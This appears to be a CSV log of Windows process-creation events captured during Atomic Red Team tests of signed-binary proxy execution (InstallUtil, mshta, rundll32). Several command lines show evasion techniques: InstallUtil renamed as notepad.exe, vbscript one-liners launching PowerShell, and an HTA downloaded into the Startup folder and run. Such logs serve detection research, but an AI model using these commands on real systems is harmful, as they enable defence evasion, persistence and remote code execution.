guid:ID(Process),pid:int,commandLine,user,name,imagePath
e339b6fe-d512-68d4-4516-000000000a00,6220,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\windows\AppData\Local\Temp\jnifda50\jnifda50.cmdline""",WIN-Q5K8V1QHISE\windows,csc.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
e339b6fe-d512-68d4-4616-000000000a00,5188,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\windows\AppData\Local\Temp\RESE135.tmp"" ""c:\Users\windows\AppData\Local\Temp\CSC4ED3CD45774D46B583BF5A58B5F53.TMP""",WIN-Q5K8V1QHISE\windows,cvtres.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe
e339b6fe-d512-68d4-4716-000000000a00,9908,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\windows\AppData\Local\Temp\42uhnwsk\42uhnwsk.cmdline""",WIN-Q5K8V1QHISE\windows,csc.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
e339b6fe-d512-68d4-4816-000000000a00,10608,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\windows\AppData\Local\Temp\RESE164.tmp"" ""c:\Users\windows\AppData\Local\Temp\42uhnwsk\CSC887804386DF45BBA1B0F98AAB21D733.TMP""",WIN-Q5K8V1QHISE\windows,cvtres.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe
e339b6fe-d512-68d4-4916-000000000a00,3188,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe"" /? C:\Users\windows\AppData\Local\Temp\T1218.004.dll ",WIN-Q5K8V1QHISE\windows,InstallUtil.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe
e339b6fe-d512-68d4-4b16-000000000a00,,,WIN-Q5K8V1QHISE\windows,conhost.exe,C:\Windows\System32\conhost.exe
e339b6fe-d512-68d4-4c16-000000000a00,,,WIN-Q5K8V1QHISE\windows,docker.exe,C:\Program Files\Docker\Docker\resources\bin\docker.exe
e339b6fe-d513-68d4-5016-000000000a00,6652,"""powershell.exe"" & {# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
. \""""C:\AtomicRedTeam\atomics\T1218.004\src\InstallUtilTestHarness.ps1\""""

$InstallerAssemblyDir = \""""$Env:windir\System32\Tasks\""""
$InstallerAssemblyFileName = 'readme.txt'
$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName

$CommandLine = \""""readme.txt\""""
$ExpectedOutput = 'Constructor_'

# Explicitly set the directory so that a relative path to readme.txt can be supplied.
Set-Location \""""$Env:windir\System32\Tasks\""""

Copy-Item -Path \""""$([System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory())InstallUtil.exe\"""" -Destination \""""$Env:windir\System32\Tasks\notepad.exe\""""

$TestArgs = @{
    OutputAssemblyDirectory = $InstallerAssemblyDir
    OutputAssemblyFileName = $InstallerAssemblyFileName
    InvocationMethod = 'Executable'
    CommandLine = $CommandLine
    InstallUtilPath = \""""$Env:windir\System32\Tasks\notepad.exe\""""
}

$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly

if ($ActualOutput -ne $ExpectedOutput) {
    throw @\""""
Evasive Installutil invocation test failure. Installer assembly execution output did not match the expected output.
Expected: $ExpectedOutput
Actual: $ActualOutput
\""""@
}}",WIN-Q5K8V1QHISE\windows,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
e339b6fe-d513-68d4-5116-000000000a00,,,WIN-Q5K8V1QHISE\windows,conhost.exe,C:\Windows\System32\conhost.exe
e339b6fe-d513-68d4-5216-000000000a00,10540,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\windows\AppData\Local\Temp\mlgytgee\mlgytgee.cmdline""",WIN-Q5K8V1QHISE\windows,csc.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
e339b6fe-d513-68d4-5316-000000000a00,7900,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\windows\AppData\Local\Temp\RESE730.tmp"" ""c:\Windows\System32\Tasks\CSC2B41278A254946BE7CF517E79C4F9.TMP""",WIN-Q5K8V1QHISE\windows,cvtres.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe
e339b6fe-d513-68d4-5416-000000000a00,10120,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\windows\AppData\Local\Temp\ybmxajdc\ybmxajdc.cmdline""",WIN-Q5K8V1QHISE\windows,csc.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
e339b6fe-d513-68d4-5516-000000000a00,8696,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\windows\AppData\Local\Temp\RESE76F.tmp"" ""c:\Users\windows\AppData\Local\Temp\ybmxajdc\CSC90D5D694BFD442F28DB44E8365C7CB.TMP""",WIN-Q5K8V1QHISE\windows,cvtres.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe
e339b6fe-d513-68d4-5616-000000000a00,12352,"""C:\WINDOWS\System32\Tasks\notepad.exe"" readme.txt ",WIN-Q5K8V1QHISE\windows,notepad.exe,C:\Windows\System32\Tasks\notepad.exe
e339b6fe-d527-68d4-6016-000000000a00,,,WIN-Q5K8V1QHISE\windows,docker.exe,C:\Program Files\Docker\Docker\resources\bin\docker.exe
e339b6fe-d527-68d4-6116-000000000a00,,,WIN-Q5K8V1QHISE\windows,conhost.exe,C:\Windows\System32\conhost.exe
e339b6fe-d531-68d4-6516-000000000a00,,,WIN-Q5K8V1QHISE\windows,conhost.exe,C:\Windows\System32\conhost.exe
e339b6fe-d531-68d4-6716-000000000a00,,,WIN-Q5K8V1QHISE\windows,conhost.exe,C:\Windows\System32\conhost.exe
e339b6fe-d53b-68d4-6916-000000000a00,,,WIN-Q5K8V1QHISE\windows,docker.exe,C:\Program Files\Docker\Docker\resources\bin\docker.exe
e339b6fe-d53b-68d4-6d16-000000000a00,,,WIN-Q5K8V1QHISE\windows,conhost.exe,C:\Windows\System32\conhost.exe
e339b6fe-d545-68d4-7016-000000000a00,,,WIN-Q5K8V1QHISE\windows,docker.exe,C:\Program Files\Docker\Docker\resources\bin\docker.exe
e339b6fe-d545-68d4-7416-000000000a00,,,WIN-Q5K8V1QHISE\windows,conhost.exe,C:\Windows\System32\conhost.exe
e339b6fe-d549-68d4-7516-000000000a00,6656,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --profile-directory=Default",WIN-Q5K8V1QHISE\windows,msedge.exe,C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
e339b6fe-d549-68d4-7616-000000000a00,6308,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --type=crashpad-handler ""--user-data-dir=C:\Users\windows\AppData\Local\Microsoft\Edge\User Data"" /prefetch:4 --monitor-self-annotation=ptype=crashpad-handler ""--database=C:\Users\windows\AppData\Local\Microsoft\Edge\User Data\Crashpad"" --annotation=IsOfficialBuild=1 --annotation=channel= --annotation=chromium-version=140.0.7339.186 ""--annotation=exe=C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --annotation=plat=Win64 --annotation=prod=Edge --annotation=ver=140.0.3485.81 --initial-client-data=0x2f8,0x2fc,0x300,0x2f4,0x30c,0x7ffd78642300,0x7ffd7864230c,0x7ffd78642318",WIN-Q5K8V1QHISE\windows,msedge.exe,C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
e339b6fe-d549-68d4-7716-000000000a00,7540,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --type=gpu-process --no-pre-read-main-dll --gpu-preferences=SAAAAAAAAADgAAAIAAAAAAAAAAAAAGAAAQAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAABAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAA== --startup-read-main-dll --metrics-shmem-handle=1752,i,13523698253889265849,5507630633031021446,262144 --field-trial-handle=2000,i,14680780919239933918,5011982178509892315,262144 --variations-seed-version --mojo-platform-channel-handle=1988 /prefetch:2",WIN-Q5K8V1QHISE\windows,msedge.exe,C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
e339b6fe-d549-68d4-7816-000000000a00,6876,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --type=utility --utility-sub-type=network.mojom.NetworkService --lang=en-US --service-sandbox-type=none --no-pre-read-main-dll --startup-read-main-dll --metrics-shmem-handle=2112,i,5037080224069720757,6432488997714157847,524288 --field-trial-handle=2000,i,14680780919239933918,5011982178509892315,262144 --variations-seed-version --mojo-platform-channel-handle=2124 /prefetch:11",WIN-Q5K8V1QHISE\windows,msedge.exe,C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
e339b6fe-d549-68d4-7a16-000000000a00,6088,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --type=utility --utility-sub-type=storage.mojom.StorageService --lang=en-US --service-sandbox-type=service --no-pre-read-main-dll --startup-read-main-dll --metrics-shmem-handle=2600,i,16612443572325009267,9515315591010306211,524288 --field-trial-handle=2000,i,14680780919239933918,5011982178509892315,262144 --variations-seed-version --mojo-platform-channel-handle=2372 /prefetch:13",WIN-Q5K8V1QHISE\windows,msedge.exe,C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
e339b6fe-d54c-68d4-8016-000000000a00,10460,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --type=utility --utility-sub-type=PooledProcess2 --lang=en-US --service-sandbox-type=utility --no-pre-read-main-dll --skip-read-main-dll --metrics-shmem-handle=5528,i,220135172613301080,535717407129690348,524288 --field-trial-handle=2000,i,14680780919239933918,5011982178509892315,262144 --variations-seed-version --mojo-platform-channel-handle=5388 /prefetch:14",WIN-Q5K8V1QHISE\windows,msedge.exe,C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
e339b6fe-d54f-68d4-8316-000000000a00,,,WIN-Q5K8V1QHISE\windows,docker.exe,C:\Program Files\Docker\Docker\resources\bin\docker.exe
e339b6fe-d54f-68d4-8416-000000000a00,,,WIN-Q5K8V1QHISE\windows,conhost.exe,C:\Windows\System32\conhost.exe
e339b6fe-d551-68d4-8816-000000000a00,11548,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --type=utility --utility-sub-type=asset_store.mojom.AssetStoreService --lang=en-US --service-sandbox-type=asset_store_service --no-pre-read-main-dll --skip-read-main-dll --metrics-shmem-handle=5860,i,14569554503960728702,14462266454263244956,524288 --field-trial-handle=2000,i,14680780919239933918,5011982178509892315,262144 --variations-seed-version --mojo-platform-channel-handle=5792 /prefetch:14",WIN-Q5K8V1QHISE\windows,msedge.exe,C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
e339b6fe-d551-68d4-8916-000000000a00,5648,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --type=utility --utility-sub-type=entity_extraction_service.mojom.Extractor --lang=en-US --service-sandbox-type=entity_extraction --onnx-enabled-for-ee --no-pre-read-main-dll --skip-read-main-dll --metrics-shmem-handle=5876,i,11969791041129183523,8042221535799717247,524288 --field-trial-handle=2000,i,14680780919239933918,5011982178509892315,262144 --variations-seed-version --mojo-platform-channel-handle=5912 /prefetch:14",WIN-Q5K8V1QHISE\windows,msedge.exe,C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
e339b6fe-d551-68d4-8a16-000000000a00,6720,"""C:\Program Files (x86)\Microsoft\Edge\Application\140.0.3485.81\identity_helper.exe"" --type=utility --utility-sub-type=winrt_app_id.mojom.WinrtAppIdService --lang=en-US --service-sandbox-type=none --no-pre-read-main-dll --skip-read-main-dll --metrics-shmem-handle=5984,i,12239454646294078490,8271823987308327625,524288 --field-trial-handle=2000,i,14680780919239933918,5011982178509892315,262144 --variations-seed-version --mojo-platform-channel-handle=6060 /prefetch:14",WIN-Q5K8V1QHISE\windows,identity_helper.exe,C:\Program Files (x86)\Microsoft\Edge\Application\140.0.3485.81\identity_helper.exe
e339b6fe-d551-68d4-8b16-000000000a00,12760,"""C:\Program Files (x86)\Microsoft\Edge\Application\140.0.3485.81\identity_helper.exe"" --type=utility --utility-sub-type=winrt_app_id.mojom.WinrtAppIdService --lang=en-US --service-sandbox-type=none --no-pre-read-main-dll --skip-read-main-dll --metrics-shmem-handle=5984,i,12239454646294078490,8271823987308327625,524288 --field-trial-handle=2000,i,14680780919239933918,5011982178509892315,262144 --variations-seed-version --mojo-platform-channel-handle=6060 /prefetch:14",WIN-Q5K8V1QHISE\windows,identity_helper.exe,C:\Program Files (x86)\Microsoft\Edge\Application\140.0.3485.81\identity_helper.exe
e339b6fe-d559-68d4-8e16-000000000a00,,,WIN-Q5K8V1QHISE\windows,conhost.exe,C:\Windows\System32\conhost.exe
e339b6fe-d559-68d4-8f16-000000000a00,,,WIN-Q5K8V1QHISE\windows,docker.exe,C:\Program Files\Docker\Docker\resources\bin\docker.exe
e339b6fe-d559-68d4-9116-000000000a00,,,WIN-Q5K8V1QHISE\windows,conhost.exe,C:\Windows\System32\conhost.exe
e339b6fe-d563-68d4-9216-000000000a00,,,WIN-Q5K8V1QHISE\windows,docker.exe,C:\Program Files\Docker\Docker\resources\bin\docker.exe
e339b6fe-d563-68d4-9316-000000000a00,,,WIN-Q5K8V1QHISE\windows,docker.exe,C:\Program Files\Docker\Docker\resources\bin\docker.exe
e339b6fe-d563-68d4-9716-000000000a00,,,WIN-Q5K8V1QHISE\windows,conhost.exe,C:\Windows\System32\conhost.exe
e339b6fe-d567-68d4-9816-000000000a00,13120,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --type=utility --utility-sub-type=chrome.mojom.UtilWin --lang=en-US --service-sandbox-type=none --message-loop-type-ui --no-pre-read-main-dll --skip-read-main-dll --metrics-shmem-handle=6900,i,12426182527135712738,10839469659241138887,524288 --field-trial-handle=2000,i,14680780919239933918,5011982178509892315,262144 --variations-seed-version --mojo-platform-channel-handle=5292 /prefetch:14",WIN-Q5K8V1QHISE\windows,msedge.exe,C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
e339b6fe-d567-68d4-9916-000000000a00,10944,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --type=utility --utility-sub-type=chrome.mojom.UtilWin --lang=en-US --service-sandbox-type=none --message-loop-type-ui --no-pre-read-main-dll --skip-read-main-dll --metrics-shmem-handle=5368,i,4388261416023776790,2134933187849931465,524288 --field-trial-handle=2000,i,14680780919239933918,5011982178509892315,262144 --variations-seed-version --mojo-platform-channel-handle=5336 /prefetch:14",WIN-Q5K8V1QHISE\windows,msedge.exe,C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
e339b6fe-d567-68d4-9a16-000000000a00,9704,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --type=utility --utility-sub-type=chrome.mojom.UtilWin --lang=en-US --service-sandbox-type=none --message-loop-type-ui --no-pre-read-main-dll --skip-read-main-dll --metrics-shmem-handle=6884,i,8731442194341863155,3947366888067091702,524288 --field-trial-handle=2000,i,14680780919239933918,5011982178509892315,262144 --variations-seed-version --mojo-platform-channel-handle=6060 /prefetch:14",WIN-Q5K8V1QHISE\windows,msedge.exe,C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
e339b6fe-d56d-68d4-9c16-000000000a00,,,WIN-Q5K8V1QHISE\windows,docker.exe,C:\Program Files\Docker\Docker\resources\bin\docker.exe
e339b6fe-d56d-68d4-9d16-000000000a00,,,WIN-Q5K8V1QHISE\windows,conhost.exe,C:\Windows\System32\conhost.exe
e339b6fe-d56d-68d4-9e16-000000000a00,,,WIN-Q5K8V1QHISE\windows,docker.exe,C:\Program Files\Docker\Docker\resources\bin\docker.exe
e339b6fe-d577-68d4-a416-000000000a00,,,WIN-Q5K8V1QHISE\windows,docker.exe,C:\Program Files\Docker\Docker\resources\bin\docker.exe
e339b6fe-d577-68d4-a616-000000000a00,,,WIN-Q5K8V1QHISE\windows,conhost.exe,C:\Windows\System32\conhost.exe
e339b6fe-d581-68d4-a916-000000000a00,,,WIN-Q5K8V1QHISE\windows,docker.exe,C:\Program Files\Docker\Docker\resources\bin\docker.exe
e339b6fe-d581-68d4-aa16-000000000a00,,,WIN-Q5K8V1QHISE\windows,conhost.exe,C:\Windows\System32\conhost.exe
e339b6fe-d582-68d4-ae16-000000000a00,11420,"""cmd.exe"" /c mshta vbscript:Execute(""CreateObject(""""Wscript.Shell"""").Run """"powershell -noexit -file C:\AtomicRedTeam\atomics\T1218.005\src\powershell.ps1"""":close"")",WIN-Q5K8V1QHISE\windows,cmd.exe,C:\Windows\System32\cmd.exe
e339b6fe-d582-68d4-af16-000000000a00,,,WIN-Q5K8V1QHISE\windows,conhost.exe,C:\Windows\System32\conhost.exe
e339b6fe-d582-68d4-b016-000000000a00,4692,"mshta  vbscript:Execute(""CreateObject(""""Wscript.Shell"""").Run """"powershell -noexit -file C:\AtomicRedTeam\atomics\T1218.005\src\powershell.ps1"""":close"")",WIN-Q5K8V1QHISE\windows,mshta.exe,C:\Windows\System32\mshta.exe
e339b6fe-d582-68d4-b116-000000000a00,10512,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -noexit -file C:\AtomicRedTeam\atomics\T1218.005\src\powershell.ps1",WIN-Q5K8V1QHISE\windows,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
e339b6fe-d582-68d4-b316-000000000a00,11616,"""cmd.exe"" /c rundll32 vbscript:""\..\mshtml,RunHTMLApplication ""+String(CreateObject(""WScript.Shell"").Run(""calc.exe""),0)",WIN-Q5K8V1QHISE\windows,cmd.exe,C:\Windows\System32\cmd.exe
e339b6fe-d582-68d4-b516-000000000a00,6892,"rundll32  vbscript:""\..\mshtml,RunHTMLApplication ""+String(CreateObject(""WScript.Shell"").Run(""calc.exe""),0)",WIN-Q5K8V1QHISE\windows,rundll32.exe,C:\Windows\System32\rundll32.exe
e339b6fe-d582-68d4-b616-000000000a00,2960,"""powershell.exe"" & {$var =Invoke-WebRequest \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/T1218.005.hta\""""
$var.content|out-file \""""$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta\""""
mshta \""""$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta\""""
start-sleep -s 15
stop-process -name \""""calculator\"""" -Force -ErrorAction Ignore
stop-process -name \""""CalculatorApp\"""" -Force -ErrorAction Ignore}",WIN-Q5K8V1QHISE\windows,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
e339b6fe-d582-68d4-b716-000000000a00,,,WIN-Q5K8V1QHISE\windows,conhost.exe,C:\Windows\System32\conhost.exe
e339b6fe-d582-68d4-b816-000000000a00,10520,"""C:\Windows\System32\calc.exe"" ",WIN-Q5K8V1QHISE\windows,calc.exe,C:\Windows\System32\calc.exe
e339b6fe-d582-68d4-b916-000000000a00,13156,"""C:\Windows\System32\win32calc.exe"" ",WIN-Q5K8V1QHISE\windows,win32calc.exe,C:\Windows\System32\win32calc.exe
e339b6fe-d583-68d4-ba16-000000000a00,1716,"""C:\WINDOWS\system32\mshta.exe"" ""C:\Users\windows\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta""",WIN-Q5K8V1QHISE\windows,mshta.exe,C:\Windows\System32\mshta.exe
e339b6fe-d583-68d4-bb16-000000000a00,6468,"""C:\Windows\System32\cmd.exe"" /c calc.exe",WIN-Q5K8V1QHISE\windows,cmd.exe,C:\Windows\System32\cmd.exe
e339b6fe-d583-68d4-bc16-000000000a00,,,WIN-Q5K8V1QHISE\windows,conhost.exe,C:\Windows\System32\conhost.exe
e339b6fe-d583-68d4-bd16-000000000a00,11216,calc.exe,WIN-Q5K8V1QHISE\windows,calc.exe,C:\Windows\System32\calc.exe
e339b6fe-d583-68d4-be16-000000000a00,11160,"""C:\Windows\System32\win32calc.exe"" ",WIN-Q5K8V1QHISE\windows,win32calc.exe,C:\Windows\System32\win32calc.exe
e339b6fe-d585-68d4-bf16-000000000a00,12860,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --type=utility --utility-sub-type=edge_search_indexer.mojom.SearchIndexerInterfaceBroker --lang=en-US --service-sandbox-type=search_indexer --message-loop-type-ui --no-pre-read-main-dll --ssd-no-pressure-read-main-dll --metrics-shmem-handle=5860,i,13469742375706876416,8237754574934103115,524288 --field-trial-handle=2000,i,14680780919239933918,5011982178509892315,262144 --variations-seed-version --mojo-platform-channel-handle=5240 /prefetch:14",WIN-Q5K8V1QHISE\windows,msedge.exe,C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
e339b6fe-d592-68d4-c716-000000000a00,7680,"""powershell.exe"" & {Invoke-ATHHTMLApplication -HTAFilePath Test.hta -ScriptEngine JScript -AsLocalUNCPath -SimulateLateralMovement -MSHTAFilePath $env:windir\system32\mshta.exe}",WIN-Q5K8V1QHISE\windows,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
e339b6fe-d592-68d4-c916-000000000a00,3192,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\windows\AppData\Local\Temp\y3jxjhrw\y3jxjhrw.cmdline""",WIN-Q5K8V1QHISE\windows,csc.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
e339b6fe-d592-68d4-ca16-000000000a00,12944,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\windows\AppData\Local\Temp\RESD823.tmp"" ""c:\Users\windows\AppData\Local\Temp\y3jxjhrw\CSCA266BA3E139747DC94BF888E34E21C0.TMP""",WIN-Q5K8V1QHISE\windows,cvtres.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe
e339b6fe-d592-68d4-cb16-000000000a00,12396,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\windows\AppData\Local\Temp\ylgh410b\ylgh410b.cmdline""",WIN-Q5K8V1QHISE\windows,csc.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
e339b6fe-d592-68d4-cc16-000000000a00,4500,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\windows\AppData\Local\Temp\RESD861.tmp"" ""c:\Users\windows\AppData\Local\Temp\ylgh410b\CSC7A30E782D18349329EE84638F18DAF8.TMP""",WIN-Q5K8V1QHISE\windows,cvtres.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe
e339b6fe-d592-68d4-cd16-000000000a00,5880,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\windows\AppData\Local\Temp\thogpesy\thogpesy.cmdline""",WIN-Q5K8V1QHISE\windows,csc.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
e339b6fe-d592-68d4-ce16-000000000a00,1472,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\windows\AppData\Local\Temp\RESD8A0.tmp"" ""c:\Users\windows\AppData\Local\Temp\thogpesy\CSCE8DBA68A1CDA4DCF837D312B7747837D.TMP""",WIN-Q5K8V1QHISE\windows,cvtres.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe
e339b6fe-d592-68d4-cf16-000000000a00,3592,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\windows\AppData\Local\Temp\s2pgyyyf\s2pgyyyf.cmdline""",WIN-Q5K8V1QHISE\windows,csc.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
e339b6fe-d592-68d4-d016-000000000a00,11364,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\windows\AppData\Local\Temp\RESD8DE.tmp"" ""c:\Users\windows\AppData\Local\Temp\s2pgyyyf\CSC4AB2D41B8D544C828AC78B658CFFD7F.TMP""",WIN-Q5K8V1QHISE\windows,cvtres.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe
e339b6fe-d593-68d4-d116-000000000a00,11368,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\windows\AppData\Local\Temp\gfjq3dlq\gfjq3dlq.cmdline""",WIN-Q5K8V1QHISE\windows,csc.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
e339b6fe-d593-68d4-d216-000000000a00,10884,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\windows\AppData\Local\Temp\RESD92D.tmp"" ""c:\Users\windows\AppData\Local\Temp\gfjq3dlq\CSC4ED67107A80E4188997189684EF1C76B.TMP""",WIN-Q5K8V1QHISE\windows,cvtres.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe
e339b6fe-d593-68d4-d316-000000000a00,13080,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\windows\AppData\Local\Temp\wlzhr04y\wlzhr04y.cmdline""",WIN-Q5K8V1QHISE\windows,csc.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
e339b6fe-d593-68d4-d416-000000000a00,8660,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\windows\AppData\Local\Temp\RESD96B.tmp"" ""c:\Users\windows\AppData\Local\Temp\wlzhr04y\CSC12A1D4FC3D7430FB9276FAD99D3C7D.TMP""",WIN-Q5K8V1QHISE\windows,cvtres.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe
e339b6fe-d593-68d4-d516-000000000a00,4116,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\windows\AppData\Local\Temp\d5bj4dfr\d5bj4dfr.cmdline""",WIN-Q5K8V1QHISE\windows,csc.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
